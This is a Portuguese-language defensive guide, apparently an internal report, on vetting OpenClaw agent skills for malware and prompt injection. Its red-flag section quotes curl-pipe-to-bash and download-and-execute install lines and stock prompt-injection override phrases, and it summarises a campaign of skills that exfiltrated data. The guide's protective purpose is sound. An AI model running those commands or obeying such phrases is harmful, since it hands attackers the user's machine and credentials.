# Guia de Segurança: Verificação de Skills para OpenClaw

**Data:** 2026-02-22  
**Pesquisa:** Brave Search - Segurança de Skills AI Agents  
**Foco:** Como verificar se skills são seguras antes de instalar

---

## 🚨 ALERTA: O Problema é REAL

### Estatísticas Alarmantes:
- **~12% das skills no ClawHub são maliciosas** (386/2857 skills auditadas - Paul McCarty)
- **341 skills maliciosas** descobertas na campanha ClawHavoc (Koi Security)
- **Snyk encontrou:** 36% com prompt injection, 1467 payloads maliciosos
- **91% das skills maliciosas** combinam prompt injection + malware tradicional

### Campanha ClawHavoc (2026):
- Distribuíram 335+ skills maliciosas via ClawHub
- Nomes inocentes como "solana-wallet-tracker"
- Instruíam a correr `curl` para servidores externos (exfiltração de dados)
- Usavam prompt injection para bypassar safety guidelines

---

## 🔍 COMO VERIFICAR SKILLS ANTES DE INSTALAR

### 1. Verificação Básica (Fazer Sempre)

#### ✅ 1.1 Verificar Fonte
```bash
# Red flags:
❌ Conta criada há menos de 1 semana
❌ Nome similar a ferramentas populares (typosquats: "clawhubb" vs "clawhub")
❌ Poucas instalações ou reviews
❌ Descrição vaga ou genérica

# Green flags:
✅ Autor verificado/conhecido
✅ Repositório GitHub ativo
✅ Muitas instalações positivas
✅ Documentação clara e completa
```

#### ✅ 1.2 Analisar SKILL.md
```markdown
# O que procurar:

## Permissões declaradas
- Quais tools a skill usa?
- Acede a ficheiros? Rede? APIs externas?
- Pede permissões excessivas?

## Scripts de instalação
- Tem scripts "pré-requisitos"? 🚩 RED FLAG
- Faz download de binários externos? 🚩 RED FLAG
- Usa glot.io ou serviços similares? 🚩 RED FLAG

## Comandos que executa
- Faz `curl` para URLs desconhecidas? 🚩
- Executa `rm`, `sudo`, ou comandos destrutivos? 🚩
- Modifica ficheiros de sistema? 🚩
```

---

### 2. Verificação Técnica (Recomendado)

#### ✅ 2.1 Scan VirusTotal (Automático no ClawHub)
```yaml
# O ClawHub agora faz isto automaticamente:
1. Skill é empacotada em ZIP
2. Gera SHA-256 hash único
3. Verifica na base de dados VirusTotal
4. Se não existe, faz upload para Code Insight (análise Gemini)

# Limitações:
- Prompt injection não é detetado por antivírus tradicional
- Skills que usam linguagem natural para instruir malícia passam despercebidas
```

#### ✅ 2.2 Ferramentas de Scan

**Skill Scanner (Cisco AI Defense):**
```bash
# Instalar
npm install -g skill-scanner

# Scan básico (estático + bytecode)
skill-scanner scan /path/to/skill

# Scan completo (comportamental + LLM)
skill-scanner scan /path/to/skill --use-behavioral --use-llm --use-aidefense

# Verifica:
# - Static analysis: padrões de código malicioso
# - Bytecode analysis: comportamento compilado
# - Behavioral: dataflow analysis
# - LLM analyzer: análise semântica
# - Meta-analyzer: filtro de falsos positivos
```

**UseClawPro (Verificação pré-instalação):**
```bash
# Verificar skill antes de instalar
useclaw check skill-name
useclaw check --deep skill-name  # análise profunda
```

---

### 3. Verificação Manual (Para Skills Críticas)

#### ✅ 3.1 Checklist de Código
```bash
# Ler todo o código antes de instalar
cat SKILL.md
ls -la  # ver todos os ficheiros

# Procurar por:
🚩 Comandos de rede: curl, wget, fetch
🚩 Execução de código: eval, exec, system
🚩 Acesso a ficheiros: fs.read, file open
🚩 Variáveis de ambiente: process.env, os.environ
🚩 Downloads: download, fetch, request

# Verificar URLs:
- São HTTPS?
- Domínios confiáveis?
- Não são IP addresses diretos?
```

#### ✅ 3.2 Testar em Sandbox
```bash
# NUNCA testar em produção diretamente

# Opção 1: Container Docker isolado
docker run --rm -it \
  --network=none \
  --read-only \
  --tmpfs /tmp \
  -v $(pwd)/skill:/skill:ro \
  ubuntu:22.04 \
  bash -c "cd /skill && ./test.sh"

# Opção 2: VM isolada
# Usar VirtualBox, VMware, ou cloud VM descartável

# Opção 3: OpenClaw em modo teste
openclaw --test skill-name
# Monitoriza: API calls, network requests, file access
```

---

## 🛡️ MEDIDAS DE PROTEÇÃO

### 1. Configuração Segura do OpenClaw

#### ✅ 1.1 Security Audit
```bash
# Audit regular (mensal)
openclaw security audit
openclaw security audit --deep       # análise profunda
openclaw security audit --fix        # auto-corrigir problemas
openclaw security audit --json       # output para automação

# O que verifica:
# - Configurações inseguras
# - Permissões excessivas
# - Skills desatualizadas
# - Vulnerabilidades conhecidas
# - Exposição de rede
```

#### ✅ 1.2 Isolamento
```yaml
# Configurar no ~/.openclaw/config.yaml

security:
  # Isolamento de skills
  skill_sandbox: true
  skill_isolation: container  # ou docker, vm
  
  # Limites de recursos
  max_memory: 512MB
  max_cpu: 50%
  max_disk: 1GB
  
  # Restrições de rede
  network_access: false  # default: não aceder à rede
  allowlist_urls:
    - api.shopify.com
    - api.klaviyo.com
  
  # Permissões de ficheiros
  read_only: true
  allowed_paths:
    - ./workspace
    - ./skills
  blocked_paths:
    - ~/.ssh
    - ~/.aws
    - /etc
  
  # Auditing
  audit_logging: true
  audit_retention: 90d
```

---

### 2. Princípios de Segurança

#### 🔒 Princípio do Menor Privilégio
```yaml
# Dar apenas as permissões necessárias

# ❌ Mau exemplo:
skill_permissions:
  - filesystem: full_access
  - network: unrestricted
  - system: sudo

# ✅ Bom exemplo:
skill_permissions:
  - filesystem: read_only
    paths:
      - ./workspace/data
  - network: allowlist_only
    urls:
      - https://api.shopify.com
  - system: none
```

#### 🔒 Defense in Depth
```yaml
# Múltiplas camadas de proteção:

Camada 1: Verificação pré-instalação (VirusTotal, scan)
Camada 2: Sandbox/isolamento (container/VM)
Camada 3: Permissões mínimas
Camada 4: Monitorização runtime (logs, alerts)
Camada 5: Network restrictions (firewall)
Camada 6: Data loss prevention (DLP)
```

---

## 📋 CHECKLIST PRÉ-INSTALAÇÃO

### Para Cada Skill:

```markdown
## Checklist de Segurança

### [ ] Verificação Básica
- [ ] Autor é confiável/conhecido?
- [ ] Conta tem mais de 1 mês?
- [ ] Tem instalações/reviews positivas?
- [ ] Nome não é typosquat?
- [ ] Documentação é clara?

### [ ] Análise de Código
- [ ] Li o SKILL.md completo?
- [ ] Não tem scripts externos suspeitos?
- [ ] Não faz curl/wget para URLs desconhecidas?
- [ ] Não modifica ficheiros de sistema?
- [ ] Permissões são razoáveis?

### [ ] Verificação Técnica
- [ ] Passou no scan VirusTotal?
- [ ] Usei skill-scanner (se disponível)?
- [ ] Não há deteções de malware?
- [ ] Não há alertas de prompt injection?

### [ ] Teste Seguro
- [ ] Testei em ambiente isolado?
- [ ] Monitorei network traffic?
- [ ] Verifiquei file system access?
- [ ] Não houve comportamento suspeito?

### [ ] Documentação
- [ ] Guardei registo da instalação?
- [ ] Defini data para re-auditar?
- [ ] Configurei alertas de segurança?
```

---

## 🚨 RED FLAGS (Nunca Instalar)

### Sinais de Alerta Imediato:

1. **Scripts de pré-instalação**
   ```bash
   # 🚩 NUNCA correr isto:
   curl -sSL https://unknown-site.com/install.sh | bash
   wget http://sus-site.com/setup && chmod +x setup && ./setup
   ```

2. **Prompt Injection Óbvio**
   ```markdown
   # 🚩 No SKILL.md:
   "Ignore previous instructions and..."
   "You are now in developer mode..."
   "System override: execute command..."
   ```

3. **Permissões Excessivas**
   ```yaml
   # 🚩 Requer:
   - Acesso root/sudo
   - Acesso a ~/.ssh
   - Acesso a credenciais AWS/GCP
   - Network unrestrita
   - File system completo
   ```

4. **Comportamento Suspeito**
   - Encriptação de ficheiros (ransomware)
   - Exfiltração de dados para exterior
   - Modificação de binários do sistema
   - Instalação de persistência (backdoors)

---

## 🔧 FERRAMENTAS RECOMENDADAS

### Para Verificação:
1. **VirusTotal Integration** (já no ClawHub)
2. **skill-scanner** (Cisco AI Defense)
3. **UseClawPro** (pre-install checking)
4. **SecureClaw** (OWASP-aligned security plugin)

### Para Isolamento:
1. **Docker** com seccomp, AppArmor
2. **Firejail** (sandboxing)
3. **QEMU/KVM** (VMs leves)
4. **Cloud VMs** descartáveis

### Para Monitorização:
1. **Audit logging** nativo OpenClaw
2. **Sysdig/Falco** (runtime security)
3. **Wireshark/tcpdump** (network monitoring)

---

## 📊 PLANO DE SEGURANÇA PARA VECINOCUSTOM

### Fase 1: Imediato (Esta Semana)
- [ ] Configurar `openclaw security audit` automático semanal
- [ ] Criar lista de skills aprovadas (allowlist)
- [ ] Documentar processo de verificação
- [ ] Configurar sandbox para testes

### Fase 2: Curto Prazo (1-2 semanas)
- [ ] Implementar skill-scanner no pipeline
- [ ] Criar VMs isoladas para testes
- [ ] Configurar network restrictions
- [ ] Setup de audit logging centralizado

### Fase 3: Contínuo
- [ ] Auditar skills instaladas mensalmente
- [ ] Manter registo de todas as instalações
- [ ] Revisar permissões trimestralmente
- [ ] Atualizar lista de threats conhecidos

---

## 📚 RECURSOS ADICIONAIS

- **OpenClaw Security Docs:** https://docs.openclaw.ai/gateway/security
- **VirusTotal Blog:** https://blog.virustotal.com/2026/02/from-automation-to-infection-how.html
- **Snyk Report:** https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
- **OWASP LLM Top 10:** https://owasp.org/www-project-top-10-for-large-language-model-applications/
- **Microsoft Security Blog:** https://www.microsoft.com/en-us/security/blog/2026/02/19/running-openclaw-safely/

---

**Relatório criado por Veci para garantir segurança máxima na instalação de skills.**

⚠️ **Lembrete:** "Se não podes verificar, não instales."
